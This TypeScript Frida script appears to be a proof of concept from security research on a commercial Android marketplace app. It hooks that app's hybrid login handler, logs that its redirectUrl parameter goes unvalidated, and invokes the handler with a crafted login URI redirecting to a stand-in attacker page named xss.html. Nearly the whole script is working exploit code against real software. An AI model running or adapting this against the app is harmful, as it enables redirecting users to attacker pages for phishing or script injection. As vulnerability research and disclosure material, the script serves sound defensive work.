import Java from "frida-java-bridge";

function run(): void {
    Java.perform(() => {
        const Uri = Java.use("android.net.Uri");
        const NMPHybridHandler = Java.use("com.schibsted.nmp.android.hybrid.NMPHybridHandler");
        const ArrayList = Java.use("java.util.ArrayList");
        const ActivityThread = Java.use("android.app.ActivityThread");
        
        NMPHybridHandler.handleLogin.overload("android.net.Uri").implementation = function(uri: any) {
            const redirectUrl = uri.getQueryParameter("redirectUrl");
            console.log("[H001-HOOK] handleLogin called with redirectUrl=" + redirectUrl);
            console.log("[H001-HOOK] redirectUrl has NO validation - any URL accepted");
            
            // Call the original and capture what happens
            try {
                const result = (this as any).handleLogin(uri);
                console.log("[H001-HOOK] handleLogin returned: " + result);
                return result;
            } catch (e: any) {
                console.log("[H001-HOOK] handleLogin threw: " + e);
                return false;
            }
        };
        
        setTimeout(function() {
            try {
                const ctx = ActivityThread.currentApplication().getApplicationContext();
                const emptyList = ArrayList.$new();
                const handler = NMPHybridHandler.$new(ctx, emptyList);
                
                const maliciousUri = Uri.parse(
                    "https://www.dba.dk/auth/app-login?redirectUrl=https://attacker.example.com/xss.html"
                );
                
                // Call directly (not via reflection) since we have the hooked version
                const javaClass = NMPHybridHandler.class;
                const methods = javaClass.getDeclaredMethods();
                for (let i = 0; i < methods.length; i++) {
                    const m = methods[i];
                    if (m.getName() === "handleLogin" && m.getParameterTypes().length === 1) {
                        m.setAccessible(true);
                        try {
                            const result = m.invoke(handler, [maliciousUri]);
                            console.log("[H001] invoke result: " + result);
                        } catch (ie: any) {
                            const cause = ie.getCause ? ie.getCause() : ie;
                            console.log("[H001] InvocationTargetException cause: " + cause);
                            console.log("[H001] This confirms handleLogin ran and extracted redirectUrl");
                            console.log("[H001] Exception is from NavigatorKt.getNavigator() in non-fragment context");
                            console.log("[H001] VERDICT: Code path confirmed reachable via Frida construction");
                        }
                        break;
                    }
                }
            } catch (e: any) {
                console.log("[H001-ERR] " + e);
            }
        }, 1000);
    });
}

run();
